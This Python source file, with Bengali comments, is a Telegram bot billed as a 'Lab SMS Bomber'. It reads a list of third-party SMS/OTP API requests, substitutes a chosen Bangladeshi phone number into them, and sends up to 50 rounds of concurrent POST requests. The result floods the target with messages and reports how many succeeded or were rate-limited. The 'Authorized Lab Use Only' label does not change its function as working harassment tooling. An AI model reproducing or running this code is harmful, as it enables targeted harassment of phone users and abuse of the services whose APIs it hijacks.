import os
import re
import json
import time
import asyncio
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

# ============== কনফিগারেশন (Railway Environment Variables থেকে) ==============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
AUTHORIZED_USER_ID = int(os.environ.get("AUTHORIZED_USER_ID", "0"))
API_FILE = os.environ.get("API_FILE", "total_api.txt")
MAX_WORKERS = int(os.environ.get("MAX_WORKERS", "20"))
# =============================================================================

# টোকেন বা আইডি না থাকলে বট চলবে না
if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN environment variable সেট করা হয়নি!")
if not AUTHORIZED_USER_ID:
    raise SystemExit("❌ AUTHORIZED_USER_ID environment variable সেট করা হয়নি!")

# গ্লোবাল লক (প্রিন্ট নিরাপদ করার জন্য)
print_lock = Lock()
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

def load_apis():
    """total_api.txt পার্স করে API লিস্ট বের করে"""
    apis = []
    try:
        with open(API_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
    except FileNotFoundError:
        return []

    i = 0
    while i < len(lines):
        line = lines[i].strip()
        if line.startswith("URL: "):
            url = line.split("URL: ")[1].strip()
            i += 1
            
            # Method লাইন স্কিপ
            if i < len(lines) and "Method:" in lines[i]:
                i += 1

            # Headers সেকশন খুঁজে বের করা
            while i < len(lines) and "--- Headers ---" not in lines[i]:
                i += 1
            i += 1

            headers = {}
            while i < len(lines):
                line_c = lines[i].strip()
                if not line_c or "---" in line_c:
                    break
                if ": " in line_c:
                    key, val = line_c.split(": ", 1)
                    headers[key] = val
                i += 1

            # Body সেকশন খুঁজে বের করা
            while i < len(lines) and "--- Body (Payload) ---" not in lines[i]:
                i += 1
            i += 1

            body_lines = []
            while i < len(lines):
                line_c = lines[i]
                if "--- cURL" in line_c or "==========" in line_c or line_c.strip().startswith("URL:"):
                    break
                body_lines.append(line_c)
                i += 1

            body_str = "".join(body_lines).strip()
            try:
                body_json = json.loads(body_str) if body_str else {}
            except:
                body_json = {}

            apis.append({"url": url, "headers": headers, "body": body_json})
        else:
            i += 1
    return apis

def replace_phone(text, target_phone):
    """হার্ডকোডেড নম্বরগুলোকে টার্গেট নম্বর দিয়ে রিপ্লেস করে"""
    text = text.replace("01976173440", target_phone)
    text = text.replace("+8801976173440", f"+880{target_phone[1:]}")
    text = text.replace("8801976173440", f"880{target_phone[1:]}")
    text = text.replace("1976173440", target_phone[1:])
    return text

def send_single_request(api, phone):
    """একটি API-তে রিকোয়েস্ট পাঠায় এবং স্ট্যাটাস রিটার্ন করে"""
    url = replace_phone(api["url"], phone)
    headers = {k: replace_phone(v, phone) for k, v in api["headers"].items()}
    body = api["body"]
    
    body_str = json.dumps(body, ensure_ascii=False)
    body_str = replace_phone(body_str, phone)
    try:
        new_body = json.loads(body_str)
    except:
        new_body = body

    try:
        resp = requests.post(url, json=new_body, headers=headers, timeout=6)
        status = resp.status_code
        if status < 400:
            return "✅"  # সফল
        elif status == 429:
            return "⏳"  # রেট লিমিট
        else:
            return "❌"  # ব্যর্থ
    except requests.exceptions.Timeout:
        return "⏰"  # টাইমআউট
    except:
        return "⚠️"  # অন্যান্য এরর

def run_bombing(phone, rounds):
    """মূল বোম্বিং লজিক (এটি একটি আলাদা থ্রেডে চলে)"""
    apis = load_apis()
    if not apis:
        return None, 0, 0, 0, 0

    total_apis = len(apis)
    total_requests = total_apis * rounds
    success = 0
    rate_limited = 0
    failed = 0

    # সব টাস্ক জমা করা
    futures = []
    for _ in range(rounds):
        for api in apis:
            futures.append(executor.submit(send_single_request, api, phone))

    # রেজাল্ট প্রসেস করা
    for future in as_completed(futures):
        result = future.result()
        if result == "✅":
            success += 1
        elif result == "⏳":
            rate_limited += 1
        else:
            failed += 1

    return apis, total_requests, success, rate_limited, failed

# ==================== টেলিগ্রাম হ্যান্ডলার ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access.")
        return
    await update.message.reply_text(
        "🤖 *Lab SMS Bomber Bot Ready*\n\n"
        "📌 *Commands:*\n"
        "`/bomb 017XXXXXXXX 5` - Start bombing (rounds=5)\n"
        "`/status` - Check bot health\n"
        "`/help` - Show this menu\n\n"
        "⚠️ *Authorized Lab Use Only*",
        parse_mode="Markdown"
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != AUTHORIZED_USER_ID:
        await update.message.reply_text("⛔ You are not authorized to use this bot.")
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text("⚠️ Usage: `/bomb 017XXXXXXXX 5`", parse_mode="Markdown")
        return

    phone = args[0].strip()
    try:
        rounds = int(args[1])
    except:
        await update.message.reply_text("⚠️ Rounds must be a number.")
        return

    # ফোন নম্বর ভ্যালিডেশন
    if not re.match(r'^01[3-9]\d{8}$', phone):
        await update.message.reply_text("⚠️ Invalid BD number. Use 017XXXXXXXX format.")
        return

    if rounds <= 0 or rounds > 50:
        await update.message.reply_text("⚠️ Rounds must be between 1 and 50.")
        return

    # স্টার্ট মেসেজ
    start_msg = await update.message.reply_text(
        f"🚀 *Starting Attack*\n"
        f"📞 Target: `{phone}`\n"
        f"🔁 Rounds: `{rounds}`\n"
        f"⏳ Loading APIs and sending requests...",
        parse_mode="Markdown"
    )

    # বোম্বিং চালানো (একটি আলাদা থ্রেডে, যাতে বট ফ্রিজ না হয়)
    loop = asyncio.get_event_loop()
    apis, total, success, rate_limited, failed = await loop.run_in_executor(
        executor, run_bombing, phone, rounds
    )

    if apis is None:
        await start_msg.edit_text("❌ Failed to load `total_api.txt`. Make sure the file exists.")
        return

    total_apis = len(apis)
    total_sent = success + rate_limited + failed

    # ক্লিন রিপোর্ট তৈরি
    report = (
        f"✅ *Attack Completed!*\n"
        f"─────────────────\n"
        f"📞 Target    : `{phone}`\n"
        f"🔁 Rounds    : `{rounds}`\n"
        f"📡 Total APIs: `{total_apis}`\n"
        f"─────────────────\n"
        f"📤 *Requests Sent:* `{total_sent}`\n"
        f"✅ *Successful:* `{success}`\n"
        f"⏳ *Rate Limited (429):* `{rate_limited}`\n"
        f"❌ *Failed/Errors:* `{failed}`\n"
        f"─────────────────\n"
        f"⚡ *VPS Status:* Online"
    )

    await start_msg.edit_text(report, parse_mode="Markdown")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text("🟢 Bot is running smoothly on VPS.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(
        "🤖 *Commands:*\n"
        "/start - Show welcome\n"
        "/bomb `<phone>` `<rounds>` - Start attack\n"
        "/status - Check bot status\n"
        "/help - Show this help",
        parse_mode="Markdown"
    )

# ==================== মেইন ফাংশন ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("bomb", bomb_command))

    print("🤖 Bot started polling... Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
